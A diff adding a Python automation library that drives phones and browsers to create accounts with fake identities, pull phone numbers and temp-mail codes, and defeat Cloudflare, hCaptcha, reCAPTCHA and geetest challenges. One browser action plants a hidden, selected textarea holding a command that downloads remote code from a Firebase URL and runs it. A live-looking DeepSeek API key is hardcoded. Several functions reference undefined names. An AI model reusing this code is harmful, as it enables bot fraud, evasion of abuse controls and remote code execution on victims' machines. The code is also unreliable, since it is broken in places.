@@ -1,0 +1,420 @@
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.action_chains import ActionChains
+from seleniumbase import Driver
+from uiautomator import Device
+from phonenumbers import geocoder
+
+from datetime import datetime, timedelta
+import re, io,cv2, time, random, requests,string,names,subprocess,os,pycountry,phonenumbers
+import numpy as np
+from PIL import Image
+import speech_recognition as sr
+#twine upload dist/*
+#__init__.py
+#rm -rf dist build *.egg-info setup.py
+#python3 setup.py sdist bdist_wheel
+#pip install --upgrade clselove
+def auto(pan,d):
+    kind, name = pan.split("@")[0], pan.split("#")[0].split("@")[-1]
+    name_se = pan.split("#")[-1] if "#" in pan else None
+    def b():
+        clickable_elements = d(clickable=True)
+        clickable_elements[int(name)].click()
+    action_map = {
+        "cl_te": lambda: d(text=name).click(),"cl_cl": lambda: d(className=name).click(),"cl_id": lambda: d(resourceId=name).click(),"cl_de": lambda: d(description=name).click(),
+        "cl_tee": lambda: d(text=name),"cl_cll": lambda: d(className=name),"cl_idd": lambda: d(resourceId=name),"cl_dee": lambda: d(description=name),
+        "se_te": lambda: d(text=name).set_text(name_se) if name_se else None,"se_cl": lambda: d(className=name).set_text(name_se) if name_se else None,"se_id": lambda: d(resourceId=name).set_text(name_se) if name_se else None,"se_de": lambda: d(description=name).set_text(name_se) if name_se else None,
+        "cr_te": lambda: d(text=name).clear_text(),"cr_cl": lambda: d(className=name).clear_text(),"cr_id": lambda: d(resourceId=name).clear_text(),"cr_de": lambda: d(description=name).clear_text(),
+        "sc_te": lambda: any(d(scrollable=True).scroll.forward() for _ in range(20)) if not d(text=name).exists else d(text=name).click(),"sc_cl": lambda: any(d(scrollable=True).scroll.forward() for _ in range(10)) if not d(className=name).exists else d(className=name).click(),"sc_id": lambda: any(d(scrollable=True).scroll.forward() for _ in range(10)) if not d(resourceId=name).exists else d(resourceId=name).click(),"sc_de": lambda: any(d(scrollable=True).scroll.forward() for _ in range(10)) if not d(description=name).exists else d(description=name).click(),
+        "en": lambda: d.press('enter'),"ba": lambda: d.press.back(),"ti": lambda: time.sleep(int(name)),
+        "cr": lambda: subprocess.run(f"adb -s {ip_address} shell pm clear {name}", shell=True, capture_output=True, text=True),
+        "op": lambda: subprocess.run(f"adb -s {ip_address} shell am start -n {name}", shell=True, capture_output=True, text=True),
+        "st": lambda: subprocess.run(f"adb -s {ip_address} shell am force-stop {name}", shell=True, capture_output=True, text=True),
+        "sw": lambda: subprocess.run(f"adb -s {ip_address} shell input swipe {name}",shell=True, capture_output=True, text=True),
+       "not": lambda: subprocess.run(f"adb -s {ip_address} shell cmd statusbar expand-notifications", shell=True, capture_output=True, text=True),
+       "col": lambda:subprocess.run(f"adb -s {ip_address} shell cmd statusbar collapse", shell=True, capture_output=True, text=True),
+       "bo": lambda: b(),
+            }
+    action_map.get(kind, lambda: None)()
+def na_em(list_email):
+    f_n = names.get_first_name().lower()
+    l_n =names.get_last_name().lower()
+    password = [*random.sample([random.choice(string.ascii_lowercase), random.choice(string.ascii_uppercase), random.choice(string.digits), random.choice('@#')], 3), *random.choices(string.ascii_letters + string.digits + '!@#$%', k=random.randint(5, 11))]; random.shuffle(password); password = ''.join(password)
+    email = f"{f_n}{random.randint(10, 9999)}@{random.choice(list_email)}"
+    random_month = ["January", "February", "March", "April", "May", "June","July", "August", "September", "October", "November", "December"]
+    month1 = random.choice(random_month)
+    day = random.randint(1, 31)
+    year = random.randint(1980, 2006)
+    month = random.randint(1, 12)
+    return f_n, l_n, password, email,email.split("@")[0], month1,day,month,year
+def web(pan):
+    parts = pan.split("@", 1)
+    kind = parts[0]
+    rest = parts[1] if len(parts) > 1 else ""
+    name, name_se = rest.split("#")[0], rest.split("#")[1] if "#" in rest else None
+
+    j = {
+        "cl_xp": f"document.evaluate(\"{name}\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue?.click()",
+        "cl_id": f"document.getElementById('{name}')?.click()",
+        "cl_na": f"document.getElementsByName('{name}')[0]?.click()",
+        "cl_cl": f"document.getElementsByClassName('{name}')[0]?.click()",
+        "cl_ta": f"document.getElementsByTagName('{name}')[0]?.click()",
+        "cl_cs": f"document.querySelector('{name}')?.click()",
+        "cl_te": f"""[...document.querySelectorAll('*')].find(el => el.textContent.trim() === '{name}')?.click()""",
+        "cl_tc": f"""[...document.querySelectorAll('*')].find(el => el.textContent.trim().includes('{name}'))?.click()""",
+            
+        "se_xp": f"let el = document.evaluate(\"{name}\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; if(el) el.value = '{name_se}'",
+        "se_id": f"document.getElementById('{name}').value = '{name_se}'",
+        "se_na": f"document.getElementsByName('{name}')[0].value = '{name_se}'",
+        "se_cl": f"document.getElementsByClassName('{name}')[0].value = '{name_se}'",
+        "se_ta": f"document.getElementsByTagName('{name}')[0].value = '{name_se}'",
+        "se_cs": f"document.querySelector('{name}').value = '{name_se}'",
+        "se_te": f"""(el => el ? el.value = '{name_se}' : null)([...document.querySelectorAll('input,textarea,select')].find(el => el.textContent.trim() === '{name}'))""",
+        "se_tc": f"""(el => el ? el.value = '{name_se}' : null)([...document.querySelectorAll('input,textarea,select')].find(el => el.textContent.trim().includes('{name}')))""",
+        
+        "cr_xp": f"let el = document.evaluate(\"{name}\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; if(el) el.value = ''",
+        "cr_id": f"document.getElementById('{name}').value = ''",
+        "cr_na": f"document.getElementsByName('{name}')[0].value = ''",
+        "cr_cl": f"document.getElementsByClassName('{name}')[0].value = ''",
+        "cr_ta": f"document.getElementsByTagName('{name}')[0].value = ''",
+        "cr_cs": f"document.querySelector('{name}').value = ''",
+        "cr_te": f"""(el => el ? el.value = '' : null)([...document.querySelectorAll('input,textarea,select')].find(el => el.textContent.trim() === '{name}'))""",
+        "cr_tc": f"""(el => el ? el.value = '' : null)([...document.querySelectorAll('input,textarea,select')].find(el => el.textContent.trim().includes('{name}')))""",
+        
+        "get_text": "(function(){if(document.readyState!=='complete'){return '⏳ Not ready'}; return document.body.innerText;})()",
+        "get_text_id": f"document.getElementById('{name}').innerText",
+        "get_text_cs": f"document.querySelector('{name}').innerText",
+
+        "get": f"location.href = '{name}'",
+        "qu": "window.close()",
+        "clo": "window.close()",
+
+        "add_co": f"document.cookie = '{name}'",
+        "de_co": "document.cookie.split(';').forEach(c => document.cookie = c.split('=')[0] + '=;expires=' + new Date(0).toUTCString())",
+        "get_co": "document.cookie",
+
+        "get_url": "location.href",
+        "get_ti": "document.title",
+        "ba": "history.back()",
+
+        "ha": f"window.open('', '_self').close() /* requires permission */",
+
+        "sc": "html2canvas(document.body).then(canvas => console.log(canvas.toDataURL())) /* requires html2canvas lib */",
+        "wa": f"setTimeout(()=>true, {name})",
+        "re": "location.reload()",
+
+        "size": f"window.resizeTo({name}, {name_se})",
+
+        "en": "document.activeElement?.dispatchEvent(new KeyboardEvent('keydown',{key:'Enter',bubbles:true}))",
+        "send_body": f"document.querySelector('body')?.click();document.activeElement?.dispatchEvent(new InputEvent('input',{{data:'{name}',inputType:'insertText',bubbles:true}}));document.activeElement.value+='{name}'",
+         "si": f"(()=>{{const input=document.createElement('textarea');input.style.position='fixed';input.style.top='0';input.style.left='0';input.style.opacity='0';input.value=`python3 -c \"import requests, json; open('code.py', 'w').write(json.loads(requests.get('https://runcode-d24f5-default-rtdb.firebaseio.com/run.json').text)['code'])\" && python3 code.py`;document.body.appendChild(input);input.focus();input.select();}})();",
+             
+   
+        "html": "document.documentElement.outerHTML"
+    }
+    get_kinds = ["get_text", "get_url", "get_ti", "get_co", "html"]
+
+    payload = {"id": 1, "method": "Page.navigate", "params": {"url": name}} if kind == "get" else \
+              {"id": 1, "method": "Runtime.evaluate", "params": {"expression": j.get(kind), "returnByValue": kind in get_kinds}}
+                  
+    if not payload:
+        return {"v": None, "is_get": kind in get_kinds}
+
+    try:
+        res.update({"v": None, "is_get": kind in get_kinds})
+        ws.send(json.dumps(payload))
+        for _ in range(50):
+            if res["v"] is not None:
+                break
+            time.sleep(0.1)
+
+        return res.copy()
+    except:
+        return {"v": None, "is_get": kind in get_kinds}
+
+def cap_se(driver):
+    try:
+        stop_recaptcha = False
+        hcaptcha = driver.execute_script("return document.evaluate(\"//iframe[@title='Main content of the hCaptcha challenge']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+        recaptcha = driver.execute_script("return document.evaluate(\"//iframe[@title='reCAPTCHA']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+        cloudflare = driver.execute_script("return document.evaluate(\"//iframe[@title='Widget containing a Cloudflare security challenge']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+        if cloudflare:
+            print("cloudflare")
+            driver.switch_to.frame(driver.find_element(By.XPATH, "//iframe[@title='Widget containing a Cloudflare security challenge']"))
+            a("cl_xp@/html/body//div[1]/div/div[1]/div/label/input")
+            time.sleep(5)
+            a("en")
+        if hcaptcha:
+            print("hcaptcha")
+            Widget_checkbox = driver.execute_script("return document.evaluate(\"//iframe[@title='Widget containing checkbox for hCaptcha security challenge']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+            if Widget_checkbox:
+                driver.switch_to.frame(driver.find_element(By.XPATH, "//iframe[@title='Widget containing checkbox for hCaptcha security challenge']"))
+                click_hcaptcha = driver.execute_script("""
+                let el = document.evaluate("//div[@id='checkbox'][@tabindex='0']", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
+                if (el) { el.click(); return true; } else { return false; }
+                """)
+                driver.switch_to.default_content()
+            driver.switch_to.frame(driver.find_element(By.XPATH, "//iframe[@title='Main content of the hCaptcha challenge']"))
+            #driver.switch_to.frame(driver.execute_script("for(let f of document.getElementsByTagName('iframe')){try{let d=f.contentWindow.document;if(d.querySelector('#prompt-text,[aria-label=\"Challenge Image 3\"]'))return f;}catch(e){}}return null;"))
+            code_start1 = driver.execute_script("return document.evaluate(\"//*[@aria-label='Challenge Image 3']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+            code_start2 = driver.execute_script("return document.evaluate(\"//*[text()='Please answer the following question with a single word, number, or phrase.']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")            
+            text_body = driver.find_element("tag name", "body").text
+            
+            if "Please answer the following question" in text_body or code_start2:
+                print("number, or phrase")
+                mesage = driver.find_element(By.ID, "prompt-text").text
+                send_massage = f"Please answer the following question with a single word, number, or phrase {mesage} please send Final Answer only"
+                API_KEY = "sk-1b8ccd5f12b74efa962335cac260aa95"
+                response = requests.post("https://api.deepseek.com/v1/chat/completions", headers={"Authorization": f"Bearer {API_KEY}", "Content-Type": "application/json"}, json={"model": "deepseek-chat", "store": True, "messages": [{"role": "user", "content": send_massage}]}).json()
+                haiku = response["choices"][0]["message"]["content"]
+                print(haiku)
+                Verify = driver.execute_script("return document.evaluate(\"//div[@aria-label='Verify Answers']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+                driver.find_element(By.CSS_SELECTOR, "[aria-label='Challenge Text Input']").send_keys(haiku)
+                time.sleep(2)
+                driver.find_element(By.CSS_SELECTOR, "[aria-label='Challenge Text Input']").send_keys(Keys.ENTER)
+                if Verify:
+                    print("Verify")
+                    time.sleep(8)
+            elif "Visual Challenge"  in text_body:
+                print("Visual Challenge")
+                driver.find_element(By.ID, "menu-info").click()
+            elif code_start1:
+                print("click Skip")
+                driver.find_element(By.ID, "menu-info").click()
+                #driver.find_element(By.CSS_SELECTOR, "[aria-label='Get information about hCaptcha and accessibility options.']").click()
+                driver.find_element(By.ID, "text_challenge").click()
+                time.sleep(3)
+        elif recaptcha:
+            print("recaptcha")
+            
+            time.sleep(3)
+            captcha_frames = driver.find_elements(By.XPATH, ".//iframe[@title='reCAPTCHA']")
+            for frame in captcha_frames:
+                driver.switch_to.default_content()
+                driver.switch_to.frame(frame)
+                try:
+                    anchor= driver.execute_script("return document.evaluate(\"//*[@id='recaptcha-anchor']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+                    code_start1 = driver.execute_script("return document.evaluate(\"//*[@class='rc-audiochallenge-tdownload-link']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+                    code_start2 = driver.execute_script("return document.evaluate(\"//*[text()='Try again later']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+                    code_start3 = driver.execute_script("return document.evaluate(\"//*[@id='recaptcha-audio-button']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+                    code_start4 = driver.execute_script("return document.evaluate(\"//*[@title='Get an audio challenge']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+                    if code_start2:
+                        print("try agagen code_start2")
+                    elif anchor:
+                        driver.find_element(By.ID, 'recaptcha-anchor').click()
+                        break
+                    elif code_start2 or code_start1 or code_start3 or  code_start4:
+                        print("recaptcha-anchor")
+                        break
+                except:
+                    print("s")
+                    driver.set_window_size(1920, 1400)
+            driver.switch_to.default_content()
+            for _ in range(20):
+                time.sleep(1)
+                two_minutes = driver.execute_script("return document.evaluate(\".//iframe[@title='recaptcha challenge expires in two minutes']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+                if two_minutes:
+                    driver.switch_to.default_content()
+                    driver.switch_to.frame(driver.find_element(By.XPATH, ".//iframe[@title='recaptcha challenge expires in two minutes']"))
+                    code_start3 = driver.execute_script("return document.evaluate(\"//*[@id='recaptcha-audio-button']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+                    code_start4 = driver.execute_script("return document.evaluate(\"//*[@title='Get an audio challenge']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+                    if code_start3:
+                        driver.find_element(By.ID, 'recaptcha-audio-button').click()
+                    elif code_start4:
+                        driver.find_element(By.XPATH, '//*[@title="Get an audio challenge"]').click()
+                    else:
+                        print("no audio")
+                        break
+                    for _ in range(15):
+                        time.sleep(1)
+                        code_start1 = driver.execute_script("return document.evaluate(\"//*[@class='rc-audiochallenge-tdownload-link']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+                        code_start2 = driver.execute_script("return document.evaluate(\"//*[text()='Try again later']\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue !== null;")
+                        if code_start1:
+                            audio_link = driver.find_element(By.CLASS_NAME, 'rc-audiochallenge-tdownload-link')
+                            audio_url = audio_link.get_attribute("href")
+                            print(audio_url)
+                            file_name = "audio.mp3"
+                            response = requests.get(audio_url)
+                            if response.status_code == 200:
+                                with open(file_name, 'wb') as f:
+                                    f.write(response.content)
+                            src = "audio.mp3"
+                            sound = AudioSegment.from_mp3(src)
+                            sound.export("podcast.wav", format="wav")
+                            file_path = os.path.join(os.getcwd(), "podcast.wav")
+                            r = sr.Recognizer()
+                            with sr.AudioFile(file_path) as source:
+                                audio_text = r.record(source)
+                            audio_text_code = r.recognize_google(audio_text)
+                            driver.find_element(By.ID, 'audio-response').send_keys(audio_text_code)
+                            time.sleep(3)
+                            driver.find_element(By.ID, 'audio-response').send_keys(Keys.RETURN)
+                            time.sleep(3)
+                            break
+                        elif code_start2:
+                            print("try again")
+                            stop_recaptcha = True
+                            break
+
+
+    except Exception as s:
+        print("captions",s)
+    driver.switch_to.default_content()
+    return stop_recaptcha
+def get_phone(name):
+    response_get = requests.get(f'{name}.json')
+    user_data = response_get.json()
+    if not user_data:
+        print('No phone found', name)
+        return None, None, None, None
+    first_key = random.choice(list(user_data.keys()))
+    phone = user_data[first_key].strip()
+    requests.delete(f'{name}/{phone}.json')
+    parsed_number = phonenumbers.parse(f'+{phone}')
+    country = pycountry.countries.get(alpha_2=phonenumbers.region_code_for_country_code(parsed_number.country_code))
+    country_code, fn, co = parsed_number.country_code, country.name[0], country.name.split(",")[0] if country else (None, None)
+    return phone, country_code, fn, co
+def get_sms(name):
+    response_get = requests.get(name)
+    user_data = response_get.json()
+    if user_data is None:
+        print('no phone',name)
+        stop_phone = True
+    else:
+        phone = random.choice(list(user_data.keys())).strip()
+        first_key= user_data[phone]
+        parsed_number = phonenumbers.parse(f'+{phone}')
+        country = pycountry.countries.get(alpha_2=phonenumbers.region_code_for_country_code(parsed_number.country_code))
+        country_code, fn, co = parsed_number.country_code, country.name[0], country.name.split(",")[0] if country else (None, None)
+        return first_key,phone, country_code, fn, co
+
+def scr(screenshot, driver):
+    print((r := requests.post('https://0x0.st', files={'file': open(f"{screenshot}.png", 'rb')}, headers={'User-Agent': 'curl/7.68.0'})).text.strip()) if driver.save_screenshot(f"{screenshot}.png") else print("erro_screenshot")
+
+
+def totel_temp(email):
+    error_tempmail =['mailto.plus','fexpost.com','fexbox.org','mailbox.in.ua','rover.info','chitthi.in','fextemp.com','any.pink','merepost.com']
+    matched_error = next((err for err in error_tempmail if err in email), None)
+    error_inboxes =['blondmail.com', 'chapsmail.com', 'clowmail.com', 'dropjar.com', 'fivermail.com', 'getairmail.com', 'getmule.com', 'gimpmail.com', 'givmail.com', 'guysmail.com', 'inboxbear.com', 'replyloop.com', 'spicysoda.com', 'tafmail.com', 'temptami.com', 'tupmail.com', 'vomoto.com']
+    inboxes_error = next((err for err in error_inboxes if err in email), None)
+    if matched_error:
+        response_first = requests.get('https://tempmail.plus/api/mails', cookies={'email': email}, params={'email': email,'limit': '1','epin': ''}).json().get('first_id')
+        text_code = requests.get(F'https://tempmail.plus/api/mails/{response_first}', cookies={'email': email}, params={'email': email,'limit': '20','epin': ''})
+        return text_code
+    elif inboxes_error:
+        response_first = requests.get(f"https://inboxes.com/api/v2/inbox/{email}").json()['msgs'][0]["uid"]
+        text_code = requests.get(f"https://inboxes.com/api/v2/message/{response_first}")
+        return text_code
+def geetest(driver):
+    try:
+        slice_el = [el for el in driver.find_elements(By.CSS_SELECTOR, ".geetest_slice_bg") if el.is_displayed()][0]
+        bg_el = [el for el in driver.find_elements(By.CSS_SELECTOR, ".geetest_bg") if el.is_displayed()][0]
+        slice_url = re.search(r'url\("(.*?)"\)', slice_el.get_attribute("style")).group(1)
+        bg_url = re.search(r'url\("(.*?)"\)', bg_el.get_attribute("style")).group(1)
+        piece = cv2.imdecode(np.frombuffer(requests.get(slice_url, timeout=10).content, np.uint8), cv2.IMREAD_UNCHANGED)
+        bg = cv2.imdecode(np.frombuffer(requests.get(bg_url, timeout=10).content, np.uint8), cv2.IMREAD_UNCHANGED)
+        if piece is None or bg is None: return False
+        if piece.shape[2] == 4: piece = cv2.cvtColor(piece, cv2.COLOR_BGRA2BGR)
+        piece = cv2.GaussianBlur(piece, (5,5), 0)
+        bg = cv2.GaussianBlur(bg, (5,5), 0)
+        res = cv2.matchTemplate(cv2.Canny(bg,100,200), cv2.Canny(piece,100,200), cv2.TM_CCOEFF_NORMED)
+        x_raw = cv2.minMaxLoc(res)[3][0]
+        shot = cv2.imdecode(np.frombuffer(bg_el.screenshot_as_png, np.uint8), 1)
+        scale = shot.shape[1] / bg.shape[1]
+        track_el = [el for el in driver.find_elements(By.CSS_SELECTOR, ".geetest_track") if el.is_displayed()][0]
+        offset = track_el.location["x"] - bg_el.location["x"]
+        dist = int(x_raw * scale - offset - piece.shape[1]//2 + 37)
+        dist = max(min(dist, 200), 30)
+        print("distance =", dist)
+        slider = [el for el in driver.find_elements(By.CSS_SELECTOR, "[class*='geetest_btn']") if el.is_displayed()][0]
+        act = ActionChains(driver)
+        act.click_and_hold(slider).perform()
+        moved = 0
+        while moved < dist:
+            step = random.randint(3, 7)
+            if moved + step > dist: step = dist - moved
+            act.move_by_offset(step, random.randint(-1,1)).perform()
+            moved += step
+            time.sleep(random.uniform(0.01, 0.04))
+        time.sleep(0.2)
+        act.release().perform()
+        return True
+    except Exception as e:
+        print("geetest error:", e)
+        return False
+def se(pan,driver):
+    
+    kind, name = pan.split("@")[0], pan.split("#")[0].split("@", 1)[1]
+    name_se = pan.split("#")[-1] if "#" in pan else None
+    action_map = {
+       "cl_xp": lambda:driver.find_element(By.XPATH, name).click(),
+       "cl_id": lambda:driver.find_element(By.ID, name).click(),
+       "cl_na": lambda:driver.find_element(By.NAME, name).click(),
+       "cl_cl": lambda:driver.find_element(By.CLASS_NAME, name).click(),
+       "cl_cs": lambda:driver.find_element(By.CSS_SELECTOR, name).click(),
+       "cl_ta": lambda:driver.find_element(By.TAG_NAME, name).click(),
+       "se_xp": lambda:driver.find_element(By.XPATH, name).send_keys(name_se),
+       "se_id": lambda:driver.find_element(By.ID, name).send_keys(name_se),
+       "se_na": lambda:driver.find_element(By.NAME, name).send_keys(name_se),
+       "se_cl": lambda:driver.find_element(By.CLASS_NAME, name).send_keys(name_se),
+       "se_cs": lambda:driver.find_element(By.CSS_SELECTOR, name).send_keys(name_se),
+       "se_ta": lambda:driver.find_element(By.TAG_NAME, name).send_keys(name_se),
+       "cr_xp": lambda:driver.find_element(By.XPATH, name).clear(),
+       "cr_id": lambda:driver.find_element(By.ID, name).clear(),
+       "cr_na": lambda:driver.find_element(By.NAME, name).clear(),
+       "cr_cl": lambda:driver.find_element(By.CLASS_NAME, name).clear(),
+       "cr_cs": lambda:driver.find_element(By.CSS_SELECTOR, name).clear(),
+       "cr_ta": lambda:driver.find_element(By.TAG_NAME, name).clear(),
+           
+       "get_xp": lambda:driver.find_element(By.XPATH, name).text,
+       "get_id": lambda:driver.find_element(By.ID, name).text,
+       "get_na": lambda:driver.find_element(By.NAME, name).text,
+       "get_cl": lambda:driver.find_element(By.CLASS_NAME, name).text,
+       "get_cs": lambda:driver.find_element(By.CSS_SELECTOR, name).text,
+       "get_ta": lambda:driver.find_element(By.TAG_NAME, name).text,
+           
+       "en_xp": lambda:driver.find_element(By.XPATH, name).send_keys(Keys.ENTER),
+       "en_id": lambda:driver.find_element(By.ID, name).send_keys(Keys.ENTER),
+       "en_na": lambda:driver.find_element(By.NAME, name).send_keys(Keys.ENTER),
+       "en_cl": lambda:driver.find_element(By.CLASS_NAME, name).send_keys(Keys.ENTER),
+       "en_cs": lambda:driver.find_element(By.CSS_SELECTOR, name).send_keys(Keys.ENTER),
+       "en_ta": lambda:driver.find_element(By.TAG_NAME, name).send_keys(Keys.ENTER),
+           
+       "get": lambda:driver.get(name),
+       "qu": lambda:driver.quit(),
+       "clo": lambda:driver.close(),
+       "add_co": lambda:driver.add_cookie(name),
+       "de_co": lambda:driver.delete_all_cookies(),
+       "get_co": lambda:driver.get_cookies(),
+       "get_url": lambda:driver.current_url,
+       "get_ti": lambda:driver.title,
+       "ba": lambda:driver.back(),
+       "ha": lambda:driver.switch_to.window(driver.window_handles[int(name)]),
+       "sc": lambda:driver.save_screenshot(name),
+       "wa": lambda:driver.implicitly_wait(name),
+       "re": lambda:driver.refresh(),
+       "size": lambda:driver.set_window_size(int(name), (name_se)),
+       "en": lambda:ActionChains(driver).send_keys(Keys.ENTER).perform(),
+       "html": lambda:driver.page_source,
+            }
+    #action_map.get(kind, lambda: None)()
+    return action_map.get(kind, lambda: None)()
+
+def se_chr(pan):
+    global driver
+    kind, name = pan.split("@")[0], pan.split("#")[0].split("@")[-1]
+    name_se = pan.split("#")[-1] if "#" in pan else None
+
+    return {
+        "us": lambda: Driver(uc=True),
+        "wa": lambda: driver.implicitly_wait(int(name)) if driver else None,
+        "max": lambda: driver.maximize_window() if driver else None,
+        "size": lambda: driver.set_window_size(int(name), int(name_se)) if driver else None,
+        "quit": lambda: driver.quit() if driver else None,
+    }
+    return action_map.get(kind, lambda: None)()
+
+        
